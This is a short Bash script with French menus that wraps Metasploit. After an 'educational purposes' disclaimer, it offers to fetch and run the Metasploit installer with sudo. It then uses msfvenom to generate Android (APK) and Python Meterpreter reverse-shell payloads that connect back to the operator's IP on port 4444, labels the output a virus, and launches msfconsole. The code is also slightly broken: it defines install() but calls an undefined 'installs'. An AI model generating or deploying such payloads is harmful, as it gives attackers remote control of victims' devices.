#!/bin/bash
#function
function install() {
  cd ~
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
  chmod 755 msfinstall
  sudo ./msfinstall

}
#code

if (whiptail --title "condition d'utulisation" --yesno "Cette applicationest à bute éducatif et n'a pas été consu pour un bute malsain, donc n'est pas résponcable de votre utulisation." 15 60 3>&1 1>&2 2>&3); then

  whiptail --msgbox "Vous devez avoir metasploit sur votre machine pour que l'application fonctionne comvnablemants" 15 60 4 3>&1 1>&1 2>&1
  interface=$(whiptail --title "Menu Box" --menu "installation" 15 60 4 \
  "1" "installé metasploit" \
  "2" "déja installé" 3>&1 1>&2 2>&3)
  exitstatus=$?
  if [[ $exitstatus = 0 ]]; then
    if [[ $interface == "1" ]]; then
      installs
    fi

    #2em partille
    if [[ $interface == "2" ]]; then
      interface2=$(whiptail --title "Menu Box" --menu "mode de hack" 15 60 4 \
      "1" "hack android" \
      "2" "hack file python" 3>&1 1>&2 2>&3)

      if [[ $interface2 == "1" ]]; then
        ip=$(whiptail --title "ip" --inputbox "Quelle est votre addresse ip" 15 60 3>&1 1>&2 2>&3)
        msfvenom -p android/meterpreter/reverse_http lhost=$ip lport=4444 >hack.apk
        whiptail --msgbox "le virus a été généré" 15 60 4 3>&1 1>&1 2>&1
        if (whiptail --title "metasploit" --yesno "voulez vous lancer metasploit?" 15 60 3>&1 1>&2 2>&3); then
          msfconsole
        fi
      fi
      if [[ $interface2 == "2" ]]; then
        ip=$(whiptail --title "ip" --inputbox "Quelle est votre addresse ip" 15 60 3>&1 1>&2 2>&3)
        msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 >hack.py
        whiptail --msgbox "le virus a été généré" 15 60 4 3>&1 1>&1 2>&1
        if (whiptail --title "metasploit" --yesno "voulez vous lancer metasploit?" 15 60 3>&1 1>&2 2>&3); then
          msfconsole
        fi
      fi
    fi
  fi
fi
